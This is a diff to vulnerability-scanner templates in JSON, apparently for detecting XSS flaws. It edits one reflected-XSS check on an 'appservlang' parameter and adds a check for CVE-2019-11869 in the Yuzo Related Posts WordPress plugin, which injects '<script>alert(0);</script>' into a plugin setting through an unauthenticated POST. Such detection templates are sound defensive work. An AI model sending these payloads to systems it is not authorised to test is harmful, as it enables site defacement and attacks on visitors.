@@ -53,7 +53,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<svg/onload=alert(1)>"
+                "<svg/onload=confirm('xss')>"
               ]
             },
             {
@@ -67,9 +67,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?appservlang=en%22><svg/onload=alert(1)>",
-            "{{BaseURL}}:8181/index.php?appservlang=en%22><svg/onload=alert(1)>",
-            "{{BaseURL}}:8081/index.php?appservlang=en%22><svg/onload=alert(1)>"
+            "{{BaseURL}}/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E"
           ]
         }
       ]
@@ -1408,6 +1406,38 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/secure/ContactAdministrators!default.jspa"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11869",
+      "info": {
+        "author": "ganofins",
+        "description": "The Yuzo Related Posts plugin before 5.12.94 for WordPress has XSS\nbecause it mistakenly expects that is_admin() verifies that the\nrequest comes from an admin user (it actually only verifies that the\nrequest is for an admin page). An unauthenticated attacker can inject\na payload into the plugin settings, such as the\nyuzo_related_post_css_and_style setting.\n\nReferences:\n- https://www.wordfence.com/blog/2019/04/yuzo-related-posts-zero-day-vulnerability-exploited-in-the-wild\n- https://wpscan.com/vulnerability/9254\n",
+        "name": "Yuzo Related Posts plugin XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "dsl": [
+                "contains(body_2, \"<script>alert(0);</script>\") == true"
+              ],
+              "type": "dsl"
+            },
+            {
+              "dsl": [
+                "contains(tolower(all_headers_2), 'text/html') == true"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/x-www-form-urlencoded\n\nyuzo_related_post_css_and_style=</style><script>alert(0);</script>\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nUpgrade-Insecure-Requests: 1\n"
           ]
         }
       ]
